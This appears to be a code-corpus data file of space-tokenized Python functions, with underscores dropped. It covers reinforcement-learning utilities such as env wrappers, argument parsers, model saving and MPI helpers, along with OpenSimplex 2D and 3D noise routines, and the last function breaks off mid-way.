def save act ( self , path = None ) : if path is None : path = os . path . join ( logger . get dir ( ) , "model.pkl" ) with tempfile . Temporary Directory ( ) as td : save variables ( os . path . join ( td , "model" ) ) arc name = os . path . join ( td , "packed.zip" ) with zipfile . Zip File ( arc name , 'w' ) as zipf : for root , dirs , files in os . walk ( td ) : for fname in files : file path = os . path . join ( root , fname ) if file path != arc name : zipf . write ( file path , os . path . relpath ( file path , td ) ) with open ( arc name , "rb" ) as f : model data = f . read ( ) with open ( path , "wb" ) as f : cloudpickle . dump ( ( model data , self . act params ) , f )
def nature cnn ( unscaled images , * * conv kwargs ) : scaled images = tf . cast ( unscaled images , tf . float32 ) / 255. activ = tf . nn . relu h = activ ( conv ( scaled images , 'c1' , nf = 32 , rf = 8 , stride = 4 , init scale = np . sqrt ( 2 ) , * * conv kwargs ) ) h2 = activ ( conv ( h , 'c2' , nf = 64 , rf = 4 , stride = 2 , init scale = np . sqrt ( 2 ) , * * conv kwargs ) ) h3 = activ ( conv ( h2 , 'c3' , nf = 64 , rf = 3 , stride = 1 , init scale = np . sqrt ( 2 ) , * * conv kwargs ) ) h3 = conv to fc ( h3 ) return activ ( fc ( h3 , 'fc1' , nh = 512 , init scale = np . sqrt ( 2 ) ) )
def make vec env ( env id , env type , num env , seed , wrapper kwargs = None , start index = 0 , reward scale = 1.0 , flatten dict observations = True , gamestate = None ) : wrapper kwargs = wrapper kwargs or { } mpi rank = MPI . COMM WORLD . Get rank ( ) if MPI else 0 seed = seed + 10000 * mpi rank if seed is not None else None logger dir = logger . get dir ( ) def make thunk ( rank ) : return lambda : make env ( env id = env id , env type = env type , mpi rank = mpi rank , subrank = rank , seed = seed , reward scale = reward scale , gamestate = gamestate , flatten dict observations = flatten dict observations , wrapper kwargs = wrapper kwargs , logger dir = logger dir ) set global seeds ( seed ) if num env > 1 : return Subproc Vec Env ( [ make thunk ( i + start index ) for i in range ( num env ) ] ) else : return Dummy Vec Env ( [ make thunk ( start index ) ] )
def make mujoco env ( env id , seed , reward scale = 1.0 ) : rank = MPI . COMM WORLD . Get rank ( ) myseed = seed + 1000 * rank if seed is not None else None set global seeds ( myseed ) env = gym . make ( env id ) logger path = None if logger . get dir ( ) is None else os . path . join ( logger . get dir ( ) , str ( rank ) ) env = Monitor ( env , logger path , allow early resets = True ) env . seed ( seed ) if reward scale != 1.0 : from baselines . common . retro wrappers import Reward Scaler env = Reward Scaler ( env , reward scale ) return env
def make robotics env ( env id , seed , rank = 0 ) : set global seeds ( seed ) env = gym . make ( env id ) env = Flatten Dict Wrapper ( env , [ 'observation' , 'desired goal' ] ) env = Monitor ( env , logger . get dir ( ) and os . path . join ( logger . get dir ( ) , str ( rank ) ) , info keywords = ( 'is success' , ) ) env . seed ( seed ) return env
def common arg parser ( ) : parser = arg parser ( ) parser . add argument ( '--env' , help = 'environment ID' , type = str , default = 'Reacher-v2' ) parser . add argument ( '--env type' , help = 'type of environment, used when the environment type cannot be automatically determined' , type = str ) parser . add argument ( '--seed' , help = 'RNG seed' , type = int , default = None ) parser . add argument ( '--alg' , help = 'Algorithm' , type = str , default = 'ppo2' ) parser . add argument ( '--num timesteps' , type = float , default = 1e6 ) , parser . add argument ( '--network' , help = 'network type (mlp, cnn, lstm, cnn lstm, conv only)' , default = None ) parser . add argument ( '--gamestate' , help = 'game state to load (so far only used in retro games)' , default = None ) parser . add argument ( '--num env' , help = 'Number of environment copies being run in parallel. When not specified, set to number of cpus for Atari, and to 1 for Mujoco' , default = None , type = int ) parser . add argument ( '--reward scale' , help = 'Reward scale factor. Default: 1.0' , default = 1.0 , type = float ) parser . add argument ( '--save path' , help = 'Path to save trained model to' , default = None , type = str ) parser . add argument ( '--save video interval' , help = 'Save video every x steps (0 = disabled)' , default = 0 , type = int ) parser . add argument ( '--save video length' , help = 'Length of recorded video. Default: 200' , default = 200 , type = int ) parser . add argument ( '--play' , default = False , action = 'store true' ) return parser
def robotics arg parser ( ) : parser = arg parser ( ) parser . add argument ( '--env' , help = 'environment ID' , type = str , default = 'Fetch Reach-v0' ) parser . add argument ( '--seed' , help = 'RNG seed' , type = int , default = None ) parser . add argument ( '--num-timesteps' , type = int , default = int ( 1e6 ) ) return parser
def parse unknown args ( args ) : retval = { } preceded by key = False for arg in args : if arg . startswith ( '--' ) : if '=' in arg : key = arg . split ( '=' ) [ 0 ] [ 2 : ] value = arg . split ( '=' ) [ 1 ] retval [ key ] = value else : key = arg [ 2 : ] preceded by key = True elif preceded by key : retval [ key ] = arg preceded by key = False return retval
def save policy ( self , path ) : with open ( path , 'wb' ) as f : pickle . dump ( self . policy , f )
def logs ( self , prefix = 'worker' ) : logs = [ ] logs += [ ( 'success rate' , np . mean ( self . success history ) ) ] if self . compute Q : logs += [ ( 'mean Q' , np . mean ( self . Q history ) ) ] logs += [ ( 'episode' , self . n episodes ) ] if prefix != '' and not prefix . endswith ( '/' ) : return [ ( prefix + '/' + key , val ) for key , val in logs ] else : return logs
def copy obs dict ( obs ) : return { k : np . copy ( v ) for k , v in obs . items ( ) }
def value ( self , t ) : for ( l t , l ) , ( r t , r ) in zip ( self . endpoints [ : - 1 ] , self . endpoints [ 1 : ] ) : if l t <= t and t < r t : alpha = float ( t - l t ) / ( r t - l t ) return self . interpolation ( l , r , alpha ) # t does not belong to any of the pieces, so doom. assert self . outside value is not None return self . outside value
def sf01 ( arr ) : s = arr . shape return arr . swapaxes ( 0 , 1 ) . reshape ( s [ 0 ] * s [ 1 ] , * s [ 2 : ] )
def store args ( method ) : argspec = inspect . getfullargspec ( method ) defaults = { } if argspec . defaults is not None : defaults = dict ( zip ( argspec . args [ - len ( argspec . defaults ) : ] , argspec . defaults ) ) if argspec . kwonlydefaults is not None : defaults . update ( argspec . kwonlydefaults ) arg names = argspec . args [ 1 : ] @ functools . wraps ( method ) def wrapper ( * positional args , * * keyword args ) : self = positional args [ 0 ] # Get default arg values args = defaults . copy ( ) # Add provided arg values for name , value in zip ( arg names , positional args [ 1 : ] ) : args [ name ] = value args . update ( keyword args ) self . dict . update ( args ) return method ( * positional args , * * keyword args ) return wrapper
def flatten grads ( var list , grads ) : return tf . concat ( [ tf . reshape ( grad , [ U . numel ( v ) ] ) for ( v , grad ) in zip ( var list , grads ) ] , 0 )
def nn ( input , layers sizes , reuse = None , flatten = False , name = "" ) : for i , size in enumerate ( layers sizes ) : activation = tf . nn . relu if i < len ( layers sizes ) - 1 else None input = tf . layers . dense ( inputs = input , units = size , kernel initializer = tf . contrib . layers . xavier initializer ( ) , reuse = reuse , name = name + ' ' + str ( i ) ) if activation : input = activation ( input ) if flatten : assert layers sizes [ - 1 ] == 1 input = tf . reshape ( input , [ - 1 ] ) return input
def get session ( config = None ) : sess = tf . get default session ( ) if sess is None : sess = make session ( config = config , make default = True ) return sess
def initialize ( ) : new variables = set ( tf . global variables ( ) ) - ALREADY INITIALIZED get session ( ) . run ( tf . variables initializer ( new variables ) ) ALREADY INITIALIZED . update ( new variables )
def wrap deepmind ( env , episode life = True , clip rewards = True , frame stack = False , scale = False ) : if episode life : env = Episodic Life Env ( env ) if 'FIRE' in env . unwrapped . get action meanings ( ) : env = Fire Reset Env ( env ) env = Warp Frame ( env ) if scale : env = Scaled Float Frame ( env ) if clip rewards : env = Clip Reward Env ( env ) if frame stack : env = Frame Stack ( env , 4 ) return env
def gpu count ( ) : if shutil . which ( 'nvidia-smi' ) is None : return 0 output = subprocess . check output ( [ 'nvidia-smi' , '--query-gpu=gpu name' , '--format=csv' ] ) return max ( 0 , len ( output . split ( b'\n' ) ) - 2 )
def setup mpi gpus ( ) : if 'CUDA VISIBLE DEVICES' not in os . environ : if sys . platform == 'darwin' : # This Assumes if you're on OSX you're just ids = [ ] # doing a smoke test and don't want GP Us else : lrank , lsize = get local rank size ( MPI . COMM WORLD ) ids = [ lrank ] os . environ [ "CUDA VISIBLE DEVICES" ] = "," . join ( map ( str , ids ) )
def dict gather ( comm , d , op = 'mean' , assert all have data = True ) : if comm is None : return d alldicts = comm . allgather ( d ) size = comm . size k2li = defaultdict ( list ) for d in alldicts : for ( k , v ) in d . items ( ) : k2li [ k ] . append ( v ) result = { } for ( k , li ) in k2li . items ( ) : if assert all have data : assert len ( li ) == size , "only %i out of %i MPI workers have sent '%s'" % ( len ( li ) , size , k ) if op == 'mean' : result [ k ] = np . mean ( li , axis = 0 ) elif op == 'sum' : result [ k ] = np . sum ( li , axis = 0 ) else : assert 0 , op return result
def add ( self , * args , * * kwargs ) : idx = self . next idx super ( ) . add ( * args , * * kwargs ) self . it sum [ idx ] = self . max priority ** self . alpha self . it min [ idx ] = self . max priority ** self . alpha
def wrap deepmind retro ( env , scale = True , frame stack = 4 ) : env = Warp Frame ( env ) env = Clip Reward Env ( env ) if frame stack > 1 : env = Frame Stack ( env , frame stack ) if scale : env = Scaled Float Frame ( env ) return env
def model ( inpt , num actions , scope , reuse = False ) : with tf . variable scope ( scope , reuse = reuse ) : out = inpt out = layers . fully connected ( out , num outputs = 64 , activation fn = tf . nn . tanh ) out = layers . fully connected ( out , num outputs = num actions , activation fn = None ) return out
def parse cmdline kwargs ( args ) : def parse ( v ) : assert isinstance ( v , str ) try : return eval ( v ) except ( Name Error , Syntax Error ) : return v return { k : parse ( v ) for k , v in parse unknown args ( args ) . items ( ) }
def terminate ( self ) : if self . pool is not None : self . pool . terminate ( ) self . pool . join ( ) self . pool = None
def terminate ( self ) : if not self . join signal . is set ( ) : self . join signal . set ( ) # give minimal time to put generated batches in queue and gracefully shut down time . sleep ( 0.01 ) if self . main worker thread . is alive ( ) : self . main worker thread . join ( ) if self . threaded : for worker in self . workers : if worker . is alive ( ) : worker . join ( ) else : for worker in self . workers : if worker . is alive ( ) : worker . terminate ( ) worker . join ( ) # wait until all workers are fully terminated while not self . all finished ( ) : time . sleep ( 0.001 ) # empty queue until at least one element can be added and place None as signal that BL finished if self . queue . full ( ) : self . queue . get ( ) self . queue . put ( pickle . dumps ( None , protocol = - 1 ) ) time . sleep ( 0.01 ) # clean the queue, this reportedly prevents hanging threads while True : try : self . queue internal . get ( timeout = 0.005 ) except Queue Empty : break if not self . queue internal . closed : self . queue internal . close ( ) if not self . queue . closed : self . queue . close ( ) self . queue internal . join thread ( ) self . queue . join thread ( ) time . sleep ( 0.025 )
def get intersections ( self ) : if Real is float : return list ( self . intersections . keys ( ) ) else : return [ ( float ( p [ 0 ] ) , float ( p [ 1 ] ) ) for p in self . intersections . keys ( ) ]
def min item ( self ) : if self . is empty ( ) : raise Value Error ( "Tree is empty" ) node = self . root while node . left is not None : node = node . left return node . key , node . value
def max item ( self ) : if self . is empty ( ) : raise Value Error ( "Tree is empty" ) node = self . root while node . right is not None : node = node . right return node . key , node . value
def noise2d ( self , x , y ) : # Place input coordinates onto grid. stretch offset = ( x + y ) * STRETCH CONSTANT 2D xs = x + stretch offset ys = y + stretch offset # Floor to get grid coordinates of rhombus (stretched square) super-cell origin. xsb = floor ( xs ) ysb = floor ( ys ) # Skew out to get actual coordinates of rhombus origin. We'll need these later. squish offset = ( xsb + ysb ) * SQUISH CONSTANT 2D xb = xsb + squish offset yb = ysb + squish offset # Compute grid coordinates relative to rhombus origin. xins = xs - xsb yins = ys - ysb # Sum those together to get a value that determines which region we're in. in sum = xins + yins # Positions relative to origin point. dx0 = x - xb dy0 = y - yb value = 0 # Contribution (1,0) dx1 = dx0 - 1 - SQUISH CONSTANT 2D dy1 = dy0 - 0 - SQUISH CONSTANT 2D attn1 = 2 - dx1 * dx1 - dy1 * dy1 extrapolate = self . extrapolate2d if attn1 > 0 : attn1 *= attn1 value += attn1 * attn1 * extrapolate ( xsb + 1 , ysb + 0 , dx1 , dy1 ) # Contribution (0,1) dx2 = dx0 - 0 - SQUISH CONSTANT 2D dy2 = dy0 - 1 - SQUISH CONSTANT 2D attn2 = 2 - dx2 * dx2 - dy2 * dy2 if attn2 > 0 : attn2 *= attn2 value += attn2 * attn2 * extrapolate ( xsb + 0 , ysb + 1 , dx2 , dy2 ) if in sum <= 1 : # We're inside the triangle (2-Simplex) at (0,0) zins = 1 - in sum if zins > xins or zins > yins : # (0,0) is one of the closest two triangular vertices if xins > yins : xsv ext = xsb + 1 ysv ext = ysb - 1 dx ext = dx0 - 1 dy ext = dy0 + 1 else : xsv ext = xsb - 1 ysv ext = ysb + 1 dx ext = dx0 + 1 dy ext = dy0 - 1 else : # (1,0) and (0,1) are the closest two vertices. xsv ext = xsb + 1 ysv ext = ysb + 1 dx ext = dx0 - 1 - 2 * SQUISH CONSTANT 2D dy ext = dy0 - 1 - 2 * SQUISH CONSTANT 2D else : # We're inside the triangle (2-Simplex) at (1,1) zins = 2 - in sum if zins < xins or zins < yins : # (0,0) is one of the closest two triangular vertices if xins > yins : xsv ext = xsb + 2 ysv ext = ysb + 0 dx ext = dx0 - 2 - 2 * SQUISH CONSTANT 2D dy ext = dy0 + 0 - 2 * SQUISH CONSTANT 2D else : xsv ext = xsb + 0 ysv ext = ysb + 2 dx ext = dx0 + 0 - 2 * SQUISH CONSTANT 2D dy ext = dy0 - 2 - 2 * SQUISH CONSTANT 2D else : # (1,0) and (0,1) are the closest two vertices. dx ext = dx0 dy ext = dy0 xsv ext = xsb ysv ext = ysb xsb += 1 ysb += 1 dx0 = dx0 - 1 - 2 * SQUISH CONSTANT 2D dy0 = dy0 - 1 - 2 * SQUISH CONSTANT 2D # Contribution (0,0) or (1,1) attn0 = 2 - dx0 * dx0 - dy0 * dy0 if attn0 > 0 : attn0 *= attn0 value += attn0 * attn0 * extrapolate ( xsb , ysb , dx0 , dy0 ) # Extra Vertex attn ext = 2 - dx ext * dx ext - dy ext * dy ext if attn ext > 0 : attn ext *= attn ext value += attn ext * attn ext * extrapolate ( xsv ext , ysv ext , dx ext , dy ext ) return value / NORM CONSTANT 2D
def noise3d ( self , x , y , z ) : # Place input coordinates on simplectic honeycomb. stretch offset = ( x + y + z ) * STRETCH CONSTANT 3D xs = x + stretch offset ys = y + stretch offset zs = z + stretch offset # Floor to get simplectic honeycomb coordinates of rhombohedron (stretched cube) super-cell origin. xsb = floor ( xs ) ysb = floor ( ys ) zsb = floor ( zs ) # Skew out to get actual coordinates of rhombohedron origin. We'll need these later. squish offset = ( xsb + ysb + zsb ) * SQUISH CONSTANT 3D xb = xsb + squish offset yb = ysb + squish offset zb = zsb + squish offset # Compute simplectic honeycomb coordinates relative to rhombohedral origin. xins = xs - xsb yins = ys - ysb zins = zs - zsb # Sum those together to get a value that determines which region we're in. in sum = xins + yins + zins # Positions relative to origin point. dx0 = x - xb dy0 = y - yb dz0 = z - zb value = 0 extrapolate = self . extrapolate3d if in sum <= 1 : # We're inside the tetrahedron (3-Simplex) at (0,0,0) # Determine which two of (0,0,1), (0,1,0), (1,0,0) are closest. a point = 0x01 a score = xins b point = 0x02 b score = yins if a score >= b score and zins > b score : b score = zins b point = 0x04 elif a score < b score and zins > a score : a score = zins a point = 0x04 # Now we determine the two lattice points not part of the tetrahedron that may contribute. # This depends on the closest two tetrahedral vertices, including (0,0,0) wins = 1 - in sum if wins > a score or wins > b score : # (0,0,0) is one of the closest two tetrahedral vertices. c = b point if ( b score > a score ) else a point # Our other closest vertex is the closest out of a and b. if ( c & 0x01 ) == 0 : xsv ext0 = xsb - 1 xsv ext1 = xsb dx ext0 = dx0 + 1 dx ext1 = dx0 else : xsv ext0 = xsv ext1 = xsb + 1 dx ext0 = dx ext1 = dx0 - 1 if ( c & 0x02 ) == 0 : ysv ext0 = ysv ext1 = ysb dy ext0 = dy ext1 = dy0 if ( c & 0x01 ) == 0 : ysv ext1 -= 1 dy ext1 += 1 else : ysv ext0 -= 1 dy ext0 += 1 else : ysv ext0 = ysv ext1 = ysb + 1 dy ext0 = dy ext1 = dy0 - 1 if ( c & 0x04 ) == 0 : zsv ext0 = zsb zsv ext1 = zsb - 1 dz ext0 = dz0 dz ext1 = dz0 + 1 else : zsv ext0 = zsv ext1 = zsb + 1 dz ext0 = dz ext1 = dz0 - 1 else : # (0,0,0) is not one of the closest two tetrahedral vertices. c = ( a point | b point ) # Our two extra vertices are determined by the closest two. if ( c & 0x01 ) == 0 : xsv ext0 = xsb xsv ext1 = xsb - 1 dx ext0 = dx0 - 2 * SQUISH CONSTANT 3D dx ext1 = dx0 + 1 - SQUISH CONSTANT 3D else : xsv ext0 = xsv ext1 = xsb + 1 dx ext0 = dx0 - 1 - 2 * SQUISH CONSTANT 3D dx ext1 = dx0 - 1 - SQUISH CONSTANT 3D if ( c & 0x02 ) == 0 : ysv ext0 = ysb ysv ext1 = ysb - 1 dy ext0 = dy0 - 2 * SQUISH CONSTANT 3D dy ext1 = dy0 + 1 - SQUISH CONSTANT 3D else : ysv ext0 = ysv ext1 = ysb + 1 dy ext0 = dy0 - 1 - 2 * SQUISH CONSTANT 3D dy ext1 = dy0 - 1 - SQUISH CONSTANT 3D if ( c & 0x04 ) == 0 : zsv ext0 = zsb zsv ext1 = zsb - 1 dz ext0 = dz0 - 2 * SQUISH CONSTANT 3D dz ext1 = dz0 + 1 - SQUISH CONSTANT 3D else : zsv ext0 = zsv ext1 = zsb + 1 dz ext0 = dz0 - 1 - 2 * SQUISH CONSTANT 3D dz ext1 = dz0 - 1 - SQUISH CONSTANT 3D # Contribution (0,0,0) attn0 = 2 - dx0 * dx0 - dy0 * dy0 - dz0 * dz0 if attn0 > 0 : attn0 *= attn0 value += attn0 * attn0 * extrapolate ( xsb + 0 , ysb + 0 , zsb + 0 , dx0 , dy0 , dz0 ) # Contribution (1,0,0) dx1 = dx0 - 1 - SQUISH CONSTANT 3D dy1 = dy0 - 0 - SQUISH CONSTANT 3D dz1 = dz0 - 0 - SQUISH CONSTANT 3D attn1 = 2 - dx1 * dx1 - dy1 * dy1 - dz1 * dz1 if attn1 > 0 : attn1 *= attn1 value += attn1 * attn1 * extrapolate ( xsb + 1 , ysb + 0 , zsb + 0 , dx1 , dy1 , dz1 ) # Contribution (0,1,0) dx2 = dx0 - 0 - SQUISH CONSTANT 3D dy2 = dy0 - 1 - SQUISH CONSTANT 3D dz2 = dz1 attn2 = 2 - dx2 * dx2 - dy2 * dy2 - dz2 * dz2 if attn2 > 0 : attn2 *= attn2 value += attn2 * attn2 * extrapolate ( xsb + 0 , ysb + 1 , zsb + 0 , dx2 , dy2 , dz2 ) # Contribution (0,0,1) dx3 = dx2 dy3 = dy1 dz3 = dz0 - 1 - SQUISH CONSTANT 3D attn3 = 2 - dx3 * dx3 - dy3 * dy3 - dz3 * dz3 if attn3 > 0 : attn3 *= attn3 value += attn3 * attn3 * extrapolate ( xsb + 0 , ysb + 0 , zsb + 1 , dx3 , dy3 , dz3 ) elif in sum >= 2 : # We're inside the tetrahedron (3-Simplex) at (1,1,1) # Determine which two tetrahedral vertices are the closest, out of (1,1,0), (1,0,1), (0,1,1) but not (1,1,1). a point = 0x06 a score = xins b point = 0x05 b score = yins if a score <= b score and zins < b score : b score = zins b point = 0x03 elif a score > b score and zins < a score : a score = zins a point = 0x03 # Now we determine the two lattice points not part of the tetrahedron that may contribute. # This depends on the closest two tetrahedral vertices, including (1,1,1) wins = 3 - in sum if wins < a score or wins < b score : # (1,1,1) is one of the closest two tetrahedral vertices. c = b point if ( b score < a score ) else a point # Our other closest vertex is the closest out of a and b. if ( c & 0x01 ) != 0 : xsv ext0 = xsb + 2 xsv ext1 = xsb + 1 dx ext0 = dx0 - 2 - 3 * SQUISH CONSTANT 3D dx ext1 = dx0 - 1 - 3 * SQUISH CONSTANT 3D else : xsv ext0 = xsv ext1 = xsb dx ext0 = dx ext1 = dx0 - 3 * SQUISH CONSTANT 3D if ( c & 0x02 ) != 0 : ysv ext0 = ysv ext1 = ysb + 1 dy ext0 = dy ext1 = dy0 - 1 - 3 * SQUISH CONSTANT 3D if ( c & 0x01 ) != 0 : ysv ext1 += 1 dy ext1 -= 1 else : ysv ext0 += 1 dy ext0 -= 1 else : ysv ext0 = ysv ext1 = ysb dy ext0 = dy ext1 = dy0 - 3 * SQUISH CONSTANT 3D if ( c & 0x04 ) != 0 : zsv ext0 = zsb + 1 zsv ext1 = zsb + 2 dz ext0 = dz0 - 1 - 3 * SQUISH CONSTANT 3D dz ext1 = dz0 - 2 - 3 * SQUISH CONSTANT 3D else : zsv ext0 = zsv ext1 = zsb dz ext0 = dz ext1 = dz0 - 3 * SQUISH CONSTANT 3D else : # (1,1,1) is not one of the closest two tetrahedral vertices. c = ( a point & b point ) # Our two extra vertices are determined by the closest two. if ( c & 0x01 ) != 0 : xsv ext0 = xsb + 1 xsv ext1 = xsb + 2 dx ext0 = dx0 - 1 - SQUISH CONSTANT 3D dx ext1 = dx0 - 2 - 2 * SQUISH CONSTANT 3D else : xsv ext0 = xsv ext1 = xsb dx ext0 = dx0 - SQUISH CONSTANT 3D dx ext1 = dx0 - 2 * SQUISH CONSTANT 3D if ( c & 0x02 ) != 0 : ysv ext0 = ysb + 1 ysv ext1 = ysb + 2 dy ext0 = dy0 - 1 - SQUISH CONSTANT 3D dy ext1 = dy0 - 2 - 2 * SQUISH CONSTANT 3D else : ysv ext0 = ysv ext1 = ysb dy ext0 = dy0 - SQUISH CONSTANT 3D dy ext1 = dy0 - 2 * SQUISH CONSTANT 3D if ( c & 0x04 ) != 0 : zsv ext0 = zsb + 1 zsv ext1 = zsb + 2 dz ext0 = dz0 - 1 - SQUISH CONSTANT 3D dz ext1 = dz0 - 2 - 2 * SQUISH CONSTANT 3D else : zsv ext0 = zsv ext1 = zsb dz ext0 = dz0 - SQUISH CONSTANT 3D dz ext1 = dz0 - 2 * SQUISH CONSTANT 3D # Contribution (1,1,0) dx3 = dx0 - 1 - 2 * SQUISH CONSTANT 3D dy3 = dy0 - 1 - 2 * SQUISH CONSTANT 3D dz3 = dz0 - 0 - 2 * SQUISH CONSTANT 3D attn3 = 2 - dx3 * dx3 - dy3 * dy3 - dz3 * dz3 if attn3 > 0 : attn3 *= attn3 value += attn3 * attn3 * extrapolate ( xsb + 1 , ysb + 1 , zsb + 0 , dx3 , dy3 , dz3 ) # Contribution (1,0,1) dx2 = dx3 dy2 = dy0 - 0 - 2 * SQUISH CONSTANT 3D dz2 = dz0 - 1 - 2 * SQUISH CONSTANT 3D attn2 = 2 - dx2 * dx2 - dy2 * dy2 - dz2 * dz2 if attn2 > 0 : attn2 *= attn2 value += attn2 * attn2 * extrapolate ( xsb + 1 , ysb + 0 , zsb + 1 , dx2 , dy2 , dz2 ) # Contribution (0,1,1) dx1 = dx0 - 0 - 2 * SQUISH CONSTANT 3D dy1 = dy3 dz1 = dz2 attn1 = 2 - dx1 * dx1 - dy1 * dy1 - dz1 * dz1 if attn1 > 0 : attn1 *= attn1 value += attn1 * attn1 * extrapolate ( xsb + 0 , ysb + 1 , zsb + 1 , dx1 , dy1 , dz1 ) # Contribution (1,1,1) dx0 = dx0 - 1 - 3 * SQUISH CONSTANT 3D dy0 = dy0 - 1 - 3 * SQUISH CONSTANT 3D dz0 = dz0 - 1 - 3 * SQUISH CONSTANT 3D attn0 = 2 - dx0 * dx0 - dy0 * dy0 - dz0 * dz0 if attn0 > 0 : attn0 *= attn0 value += attn0 * attn0 * extrapolate ( xsb + 1 , ysb + 1 , zsb + 1 , dx0 , dy0 , dz0 ) else : # We're inside the octahedron (Rectified 3-Simplex) in between. # Decide between point (0,0,1) and (1,1,0) as closest p1 = xins + yins if p1 > 1 : a score = p1 - 1 a point = 0x03 a is further side = True else : a score = 1 - p1 a point = 0x04 a is further side = False # Decide between point (0,1,0) and (1,0,1) as closest p2 = xins + zins if p2 > 1 : b score = p2 - 1 b point = 0x05 b is further side = True else : b score = 1 - p2 b point = 0x02 b is further side = False # The closest out of the two (1,0,0) and (0,1,1) will replace the furthest out of the two decided above, if closer. p3 = yins + zins if p3 > 1 : score = p3 - 1 if a score <= b score and a score < score : a point = 0x06 a is further side = True elif a score > b score and b score < score : b point = 0x06 b is further side = True else : score = 1 - p3 if a score <= b score and a score < score : a point = 0x01 a is further side = False elif a score > b score and b score < score : b point = 0x01 b is further side = False # Where each of the two closest points are determines how the extra two vertices are calculated. if a is further side == b is further side : if a is further side : # Both closest points on (1,1,1) side # One of the two extra points is (1,1,1) dx ext0 = dx0 - 1 - 3 * SQUISH CONSTANT 3D dy ext0 = dy0 - 1 - 3 * SQUISH CONSTANT 3D dz ext0 = dz0 - 1 - 3 * SQUISH CONSTANT 3D xsv ext0 = xsb + 1 ysv ext0 = ysb + 1 zsv ext0 = zsb + 1 # Other extra point is based on the shared axis. c = ( a point & b point ) if ( c & 0x01 ) != 0 : dx ext1 = dx0 - 2 - 2 * SQUISH CONSTANT 3D dy ext1 = dy0 - 2 * SQUISH CONSTANT 3D dz ext1 = dz0 - 2 * SQUISH CONSTANT 3D xsv ext1 = xsb + 2 ysv ext1 = ysb zsv ext1 = zsb elif ( c & 0x02 ) != 0 : dx ext1 = dx0 - 2 * SQUISH CONSTANT 3D dy ext1 = dy0 - 2 - 2 * SQUISH CONSTANT 3D dz ext1 = dz0 - 2 * SQUISH CONSTANT 3D xsv ext1 = xsb ysv ext1 = ysb + 2 zsv ext1 = zsb else : dx ext1 = dx0 - 2 * SQUISH CONSTANT 3D dy ext1 = dy0 - 2 * SQUISH CONSTANT 3D dz ext1 = dz0 - 2 - 2 * SQUISH CONSTANT 3D xsv ext1 = xsb ysv ext1 = ysb zsv ext1 = zsb + 2 else : # Both closest points on (0,0,0) side # One of the two extra points is (0,0,0) dx ext0 = dx0 dy ext0 = dy0 dz ext0 = dz0 xsv ext0 = xsb ysv ext0 = ysb zsv ext0 = zsb # Other extra point is based on the omitted axis. c = ( a point | b point ) if ( c & 0x01 ) == 0 : dx ext1 = dx0 + 1 - SQUISH CONSTANT 3D dy ext1 = dy0 - 1 - SQUISH CONSTANT 3D dz ext1 = dz0 - 1 - SQUISH CONSTANT 3D xsv ext1 = xsb - 1 ysv ext1 = ysb + 1 zsv ext1 = zsb + 1 elif ( c & 0x02 ) == 0 : dx ext1 = dx0 - 1 - SQUISH CONSTANT 3D dy ext1 = dy0 + 1 - SQUISH CONSTANT 3D dz ext1 = dz0 - 1 - SQUISH CONSTANT 3D xsv ext1 = xsb + 1 ysv ext1 = ysb - 1 zsv ext1 = zsb + 1 else : dx ext1 = dx0 - 1 - SQUISH CONSTANT 3D dy ext1 = dy0 - 1 - SQUISH CONSTANT 3D dz ext1 = dz0 + 1 - SQUISH CONSTANT 3D xsv ext1 = xsb + 1 ysv ext1 = ysb + 1 zsv ext1 = zsb - 1 else : # One point on (0,0,0) side, one point on (1,1,1) side if a is further side : c1 = a point c2 = b point else : c1 = b point c2 = a point # One contribution is a  permutation of (1,1,-1) if ( c1 & 0x01 ) == 0 : dx ext0 = dx0 + 1 - SQUISH CONSTANT 3D dy ext0 = dy0 - 1 - SQUISH CONSTANT 3D dz ext0 = dz0 - 1 - SQUISH CONSTANT 3D xsv ext0 = xsb - 1 ysv ext0 = ysb + 1 zsv ext0 = zsb + 1 elif ( c1 & 0x02 ) == 0 : dx ext0 = dx0 - 1 - SQUISH CONSTANT 3D dy ext0 = dy0 + 1 - SQUISH CONSTANT 3D dz ext0 = dz0 - 1 - SQUISH CONSTANT 3D xsv ext0 = xsb + 1 ysv ext0 = ysb - 1 zsv ext0 = zsb + 1 else : dx ext0 = dx0 - 1 - SQUISH CONSTANT 3D dy ext0 = dy0 - 1 - SQUISH CONSTANT 3D dz ext0 = dz0 + 1 - SQUISH CONSTANT 3D xsv ext0 = xsb + 1 ysv ext0 = ysb + 1 zsv ext0 = zsb - 1 # One contribution is a  permutation of (0,0,2) dx ext1 = dx0 - 2 * SQUISH CONSTANT 3D dy ext1 = dy0 - 2 * SQUISH CONSTANT 3D dz ext1 = dz0 - 2 * SQUISH CONSTANT 3D xsv ext1 = xsb ysv ext1 = ysb zsv ext1 = zsb if ( c2 & 0x01 ) != 0 : dx ext1 -= 2 xsv ext1 += 2 elif ( c2 & 0x02 ) != 0 : dy ext1 -= 2 ysv ext1 += 2 else : dz ext1 -= 2 zsv ext1 += 2 # Contribution (1,0,0) dx1 = dx0 - 1 - SQUISH CONSTANT 3D dy1 = dy0 - 0 - SQUISH CONSTANT 3D dz1 = dz0 - 0 - SQUISH CONSTANT 3D attn1 = 2 - dx1 * dx1 - dy1 * dy1 - dz1 * dz1 if attn1 > 0 : attn1 *= attn1 value += attn1 * attn1 * extrapolate ( xsb + 1 , ysb + 0 , zsb + 0 , dx1 , dy1 , dz1 ) # Contribution (0,1,0) dx2 = dx0 - 0 - SQUISH CONSTANT 3D dy2 = dy0 - 1 - SQUISH CONSTANT 3D dz2 = dz1 attn2 = 2 - dx2 * dx2 - dy2 * dy2 - dz2 * dz2 if attn2 > 0 : attn2 *= attn2 value += attn2 * attn2 * extrapolate ( xsb + 0 , ysb + 1 , zsb + 0 , dx2 , dy2 , dz2 ) # Contribution (0,0,1) dx3 = dx2 dy3 = dy1 dz3 = dz0 - 1 - SQUISH CONSTANT 3D attn3 = 2 - dx3 * dx3 - dy3 * dy3 - dz3 * dz3 if attn3 > 0 : attn3 *= attn3 value += attn3 * attn3 * extrapolate ( xsb + 0 , ysb + 0 , zsb + 1 , dx3 , dy3 , dz3 ) # Contribution (1,1,0) dx4 = dx0 - 1 - 2 * SQUISH CONSTANT 3D dy4 = dy0 - 1 - 2 * SQUISH CONSTANT 3D dz4 = dz0 - 0 - 2 * SQUISH CONSTANT 3D attn4 = 2 - dx4 * dx4 - dy4 * dy4 - dz4 * dz4 if attn4 > 0 : attn4 *= attn4 value += attn4 * attn4 * extrapolate ( xsb + 1 , ysb + 1 , zsb + 0 , dx4 , dy4 , dz4 ) # Contribution (1,0,1) dx5 = dx4 dy5 = dy0 - 0 - 2 * SQUISH CONSTANT 3D dz5 = dz0 - 1 